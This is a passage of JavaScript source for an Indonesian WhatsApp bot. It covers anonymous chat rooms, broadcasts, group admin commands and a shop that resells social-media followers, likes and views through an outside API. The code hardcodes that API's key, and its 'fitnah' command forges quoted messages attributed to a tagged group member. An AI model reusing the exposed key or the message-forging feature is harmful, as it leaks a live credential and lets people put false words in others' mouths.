if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n.setlink ${setting.group.link}`)
setting.group.link = q
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
reply('Sukses mengganti link')
break

case 'setpack':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n.setlink ${setting.group.link}`)
var ppack = q.split('|')[0]
var pathor = q.split('|')[1]
setting.sticker.packname = ppack
setting.sticker.author = pathor
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
reply('Sukses mengganti packname')
break

case 'runtime':
case 'tes':
case 'bot':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`*Runtime :* ${runtime(process.uptime())}`)
break

case 'rules':{
let text_rules =`${rulesBot()}`
conn.sendMessage(from, { text: text_rules })
}
break

case 'user':
case 'db':{
if (!isOwner) return reply(mess.OnlyOwner)
let xx_us = JSON.parse(fs.readFileSync("./database/pengguna.json"));
let no = 1
let teks_db =`*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )
*• Room Chat :* ( ${db_menfes.length} )\n\n`
for (let x of xx_us){
teks_db +=`◦ User ( ${no++} ) \n◦ Nama: ${x.name}\n◦ ID: ${x.id.split('@')[0]}\n◦ Premium: ${x.premium? 'aktif':'tidak'}\n\n`
}
reply(teks_db)
}
break

case 'room':{
if (!isOwner) return reply(mess.OnlyOwner)
var room =`*CHAT ANONYMOUS*\n\n*TOTAL ROOM : ${db_menfes.length}*\n\n`
var no = 1
for (let x of db_menfes){
room +=`*ID ROOM ${x.id}*
*CHAT1: @${x.a.split('@')[0]}*
*CHAT2: @${x.b.split('@')[0]}*
*STATUS: ${x.state}*\n\n`
}
reply(room)
}
break

case 'daftarprem':
case 'buyprem':
mentions(`*Buy Premium*

*List Harga*
Rp 5.000 / Minggu
Rp 10.000 / Bulan
Rp 15.000 Permanen 

*Keuntungan Premium*
- _Add Bot 1 Group_
- _Unlock Fitur Premium_

*Tertarik? Hubungi Owner* @${setting.ownerNumber.split('@')[0]}`, [setting.ownerNumber])
break

case 'sewabot':
case 'sewa':
mentions(`*SEWA BOT*

*List Harga*
3 Hari : Rp 2.000
1 Minggu : Rp 5.000
Permanen : Rp 20.000 + Premium 

Transfer Via Dana

*Keuntungan Sewabot*
- Add Bot 1 Group
- Bot On 24 Jam

*Tertarik? Hubungi Owner* @${setting.ownerNumber.split('@')[0]}`, [setting.ownerNumber])
break

case 'cekprem':{
mentions(`*CEK PREMIUM*
◦ ID : @${cekUser("id", sender).split('@')[0]}_
◦ Status : ${cekUser("premium", sender)? 'Aktif':'Tidak'}_`, [sender])
}
break

// BROADCAST
case 'broadcast':
case 'bc':
if (!isOwner) return reply(mess.OnlyOwner)
let ano = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${ano.length} Chat\nWaktu Selesai ${ano.length * 1.5} detik`)
for (let yoi of ano) {
await sleep(1500)
let txt = `${q}`
conn.sendButtonText(yoi,
[{ 
buttonId: `.menu`, 
buttonText: { 
displayText: '🎭 Menu' 
}, type: 1 
}, {
buttonId: '.owner', 
buttonText: { 
displayText: 'Owner 👤' 
}, type: 1 
}], txt, '© broadcast', bcnye) 
}
break

case 'bclink':
if (!isOwner) return reply(mess.OnlyOwner)
let anuo = await store.chats.all().map(v => v.id)
let gambc = await getBuffer(picak + 'Broadcast')
reply(`Mengirim Broadcast Ke ${anuo.length} Chat\nWaktu Selesai ${anuo.length * 1.5} detik`)
for (let yai of anuo) {
let ttxt = `${q}`
sendArulMessage(yai, {
text: ttxt,
contextInfo:{
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": '「 BROADCAST BOT 」', 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": gambc,
"mediaUrl": setting.group.link,
"sourceUrl": setting.group.link
}
}
})
reply('Sukses Broadcast')
}
break

// OWNER ONLY
case 'setexif':
case 'exif':
case 'setwm':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n.setwm pack|author')
let nama_Pack = q.split('|')[0]
let author_Pack = q.split('|')[1]
if (!nama_Pack) return reply('*Contoh:*\n.setwm pack|author')
if (!author_Pack) return reply('*Contoh:*\n.setwm pack|author')
exif.create(nama_Pack, author_Pack)
reply('Sukses membuat exif')
}
break

case 'buat_room_chat':{
var id_satu = q.split('|')[0]
var id_dua = q.split('|')[1]
var id_rom = q.split('|')[2]
db_menfes.push({"id": id_satu, "teman": id_dua})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
db_menfes.push({"id": id_dua, "teman": id_satu})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
var tulis_pesan = `◦「 Anonymous Chat Terhubung 」◦

Silahkan Masukkan Balasan, 
Pesan Kamu Akan Diteruskan
Secara Otomatis 

Ketik .stopchat
Untuk Menghapus Sesi Chat`
var buttonMessage = {
text: tulis_pesan,
footer: 'klik button untuk menghapus sesi chat',
buttons: [
{ buttonId: '.stopchat', buttonText: {displayText: '️Berhenti'}, type: 1}
],
headerType: 1
}
conn.sendMessage(id_satu, buttonMessage)
conn.sendMessage(id_dua, buttonMessage)
}
break

case 'stopchat':
if (cekPesan("id", sender) == null) return reply(`Kamu Tidak Didalam Roomchat, Silahkan Buat Room Terlebih Dahulu.\n\n*Format :*\n.menfess num|nama|pes\n\n*Contoh :*\n.menfess 62895340684706|bot|hai\n\n*Note:*\n62895340684706 - benar (✅)\n+62 895 3406 84706 - salah (❌)`)
if (isGroup) return reply(mess.OnlyPM)
var aku = sender
var dia = cekPesan("teman", aku)
var teks_aku = `[✓] Berhasil Memberhentikan Chat`
setRoom("±id", dia, null)
setRoom("±teman", dia, null)
await sleep(2000)
conn.sendMessage(aku,{text:teks_aku})
setRoom("±id", aku, null)
setRoom("±teman", aku, null)
var teks_dia = `[✓] Room Chat Telah Dihentikan\nOleh Teman Chat Kamu👤`
conn.sendMessage(dia,{text:teks_dia})
db_menfes.splice('[]')
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
break

case 'menfes': 
case 'menfess':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam Roomchat!! Ketik *.stopchat* Untuk Menghapus Sesi Chat.")
if (!q) return reply(`Format Fitur Menfess\n\n_*Format*_\n${prefix+command} wa|pengirim|pesan\n\n_*Contoh*_\n${prefix+command} 62895340684706|bot|hai\n\n*Note :*\nBerawal Dari 628xxx Tanpa Spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
let pesan_teman = q.split('|')[2]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\nTidak Terdaftar Di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu Kan Nomor Bot🗿')
if (num == sender.split('@')[0]) return reply('Menfes Ke Nomor Sendiri:V\nCapek Ya? Semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!pesan_teman) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
let text_menfess = `Hallo Kak ${ucapanWaktu}
Ada Menfess Nih

◦ Dari : ${nama_pengirim}
◦ Pesan : ${pesan_teman}

_Pesan ini ditulis oleh seseorang_
_Bot hanya menyampaikan saja._`
let btn_menfes = [{ buttonId: `${prefix}buat_room_chat ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Terima' }, type: 1 }]
var button_menfess = {
text: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
reply('Menfess Kamu Sudah Terkirim, Moga Aja Dibales🗿')
if (isGroup) return reply("Pesan Menfess Kamu Sudah Dikirim.")
}
break

case 'request': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} tambahin fitur anti jomblo min`)
var teks = `*————「 REQUEST FITUR 」————*\n\n`
var teks1 = `Nama : ${pushname}\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var teks2 = `Succes Send To Owner`
var bg_lexxy = '62895340684706@s.whatsapp.net'
conn.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
conn.sendMessage(from, {text: teks2, mentions:[sender]}, {quoted:msg})
}
break

case 'report': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur anu error bang`)
var teks = `*————「 REPORT FITUR 」————*\n\n`
var teks1 = `Nama : ${pushname}\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var bg_lexxy = '62895340684706@s.whatsapp.net'
conn.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
conn.sendMessage(from, {text: 'Terima Kasih Atas Laporannya, Fitur Akan Diperbaiki Oleh Owner Secepatnya', mentions:[sender]}, {quoted:msg})
}
break

case 'senddb': {
if (!isOwner) return reply(mess.OnlyOwner)
reply('please wait..')
await sleep(3000)

// Read Database
var user_bot = await fs.readFileSync('./database/pengguna.json')
var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`)
var anti_link = await fs.readFileSync('./database/antilink.json')
var men_fess = await fs.readFileSync('./database/menfess.json')
var wel_come = await fs.readFileSync('./database/welcome.json')
var tik_tok = await fs.readFileSync('./database/tiktokDown.json')

// Sending Document
conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:msg})
conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:msg})
conn.sendMessage(from, { document: anti_link, mimetype: 'document/application', fileName: 'antilink.json'}, {quoted:msg})
conn.sendMessage(from, { document: men_fess, mimetype: 'document/application', fileName: 'menfess.json'}, {quoted:msg})
conn.sendMessage(from, { document: wel_come, mimetype: 'document/application', fileName: 'welcome.json'}, {quoted:msg})
conn.sendMessage(from, { document: tik_tok, mimetype: 'document/application', fileName: 'tiktokDown.json'}, {quoted:msg})
}
break
// CASE BY LEXXY OFFICIAL
// JANGAN DI EDIT LAGI YA
case 'pricelist': {
let feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=semua`)
if (feta.status == false) return reply(feta.data.msg)
let list = '*List Harga Layanan*\n\n'
for (let L of feta.data) {
list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
}
conn.sendMessage(from, {text: list}, {quoted:msg})
}
break
case 'komisi':
if (!isOwner) return reply(mess.OnlyOwner)
var komisi = await fetchJson(`http://ampibismm.my.id/api/json?bot=true&action=profile&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop`)
let reskomisi = `Hallo owner Berikut komisi anda\n*Name :* ${komisi.data.name}\n*Full Name :* ${komisi.data.full_name}\n*Komisi :* ${komisi.data.komisi}`
conn.sendMessage(from, {text: reskomisi }, {quoted:msg})
break
case 'tk': case 'tarikkomisi': {
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 1) return reply('jumlahnya berapa? minimal 10k')
var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=listwallet`)
let list = []
console.log(fetaa)
for (let L of fetaa.data) {
let no = 1
list.push({
buttonText: {displayText: L.wallet},
buttonId: `${prefix}tarikkomisikunci ${q}|${L.wallet}`,
type: `${no++}`
})}
let nyobb = list
conn.sendMessage(from, {text:`*PILLIH E-WALLET*\nPilih jenis wallet yang ingin anda gunakan!`, title: 'WALLET', footer: '©SosmedShop', buttons: nyobb})
}
break
case 'tarikkomisikunci':
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 1) return m.reply('jumlahnya berapa bang')
let juml = q.split('|')[0] ? q.split('|')[0]: q
let walle = q.split('|')[1] ? q.split('|')[1]: ''
if (walle.length < 1) return reply(`Jumlah dan Target harus di isi!`)
var tarikom = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=withdraw&amount=${juml}&wallet=${walle}&nomor=${smm_dana_number}&an=${smm_dana_nama}`)
console.log(tarikom)
conn.sendMessage(from, {text: `${tarikom.data.msg}`}, {quoted:msg})
break

case 'reseterr':
case 'clear':
case 'clearer':
case 'clearerr':{
if (!isOwner) return reply(mess.OnlyOwner)
server_eror.splice('[]')
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
reply('Done')
}
break

case 'err':
case 'error':{
if (!isOwner) return reply(mess.OnlyOwner)
var teks =`*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`
var NO = 1
for (let i of server_eror){
teks +=`=> *ERROR (${NO++})*\n${i.error}\n\n`
}
reply(teks)
}
break
case 'order':
case 'caraorder': {
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
let capp = `*Hallo Kak Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|lexxy4554_\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`
conn.sendMessage(from, {text: capp}, {quoted:msg})
}
break
case 'view': case 'like': case 'follower': {
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (args.length < 1) return reply('Format tidak valid, jika masih belum mengerti ketik *#order*')
let juma = q.split('|')[0] ? q.split('|')[0]: q
let targtt = q.split('|')[1] ? q.split('|')[1]: ''
if (targtt.length < 1) return reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|lexxy456_`)
var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=${command}`)
let list = []
var textplus = `${juma}|${targtt}`
for (let L of fetaa.data) {
list.push({
title: `${L.nama}`,
rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
description: `\n${L.desc}`
})
}
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: '© created by lexxy official',
  buttonText: "Click Here!",
  sections: [{
title: "Sosmed Shop",
  rows: list
}],
listType: 1
}
const sendMsg = await conn.sendMessage(from, listMessage)
break
}
case 'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (args.length < 1) return reply(`*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|lexxy2408_\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
let jumlah = q.split('|')[0] ? q.split('|')[0]: q
let targ = q.split('|')[1] ? q.split('|')[1]: ''
let idny = q.split('|')[2] ? q.split('|')[2]: ''
var feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
if (feta.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
let idpes = feta.data.order_id
let cap = `Hai *@${sender.split('@')[0]} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! Menggunakan QRIS.\n\n*ID Pesanan :*\n${feta.data.order_id}\n\n*Target :*\n${targ}\n\n*Jumlah Order :* ${jumlah}\n*Total Harga :* Rp${toRupiah(feta.data.amount)}\n*Status Orderan :* ${feta.data.status}\n\n*info lebih lanjut?*\n*klik button dibawah.*`
var buto = [{buttonId: `!cekstatus ${feta.data.order_id}`, buttonText: { displayText: 'Check Status' }, type: 1 }]
conn.sendMessage(from, { caption: cap, image: { url: feta.data.qris }, buttons: buto, footer: '© created by lexxy official' })
}
console.log(feta)
}
break
case 'chekstatus':
case 'cekstatus': {
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (!q) return reply('id ordernya mana kak?')
var seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=status&order_id=${q}`)
if (seta.status == false) {
var captionnye = `\nid order tidak di temukan`
} else {
var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli jasa suntik dari kami, ditunggu next ordernya!`
}
reply(captionnye)
break
}

// STORE FUN
case 'shop': case 'list':
if (!isGroup) return reply(mess.OnlyGrup)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hi @${sender.split("@")[0]}`,
buttonText: 'Click Here!',
footer: `*List From ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
break
case 'addlist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
break
case 'dellist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'update':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil update List menu : *${args1}*`)
break
case 'tambah':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'p': case 'proses':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`, [sender])
}
break
case 'd': case 'done':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`, [sender])
}
break
case 'setppbot':
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#setppbot* atau reply gambar yang sudah dikirim dengan pesan *#setppbot*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
conn.updateProfilePicture(botNumber, { url: media })
reply('Sukses Mengganti Profile Bot')
await sleep(2000)
fs.unlinkSync(media)
break
case 'git': case 'gitclone':{
if (cekUser("id", sender) == null) return daftarDlu()
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply('link githubnya mana?\n*Contoh:*\n#gitclone https://github.com/Lexxy24/MenfessV1')
var linknya = q
if (!regex1.test(linknya)) return reply('link salah!')
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
reply(`*Mohon tunggu, sedang mengirim repository..*`)
conn.sendMessage(from, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: msg }).catch((err) => reply('Maaf link github yang kamu berikan di private, dan tidak bisa di jadikan file'))
}
break

case 'fitnah':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1]
var bot = q.split("|")[2]
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
break

case 'del':
case 'delete':
if (cekUser("id", sender) == null) return daftarDlu()
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break

case 'linkgrup': 
case 'linkgc':
if (cekUser("id", sender) == null) return daftarDlu()
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break

case 'kick':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
} else {
reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
}
break

case 'setppgrup': 
case 'setppgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
await conn.updateProfilePicture(from, { url: media })
await sleep(2000)
reply('Sukses mengganti foto profile group')
fs.unlinkSync(media)
break

case 'setnamegrup': 
case 'setnamegc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} teks`)
await conn.groupUpdateSubject(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break

case 'setdesc': 
case 'setdescription':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah ${command} teks`)
await conn.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break

case 'group': 
case 'grup':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
conn.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
conn.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break

case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break

case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let teks_tagall = `*T A G - A L L*

*Pesan :* ${q ? q : 'Hallo'}\n\n`
for (let mem of participants) {
teks_tagall += `•> @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
break

case 'hidetag':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break

case 'welcome':{
if (!isGroup) return reply('Khusus Group!') 
if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return reply("Khusus admin!")
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
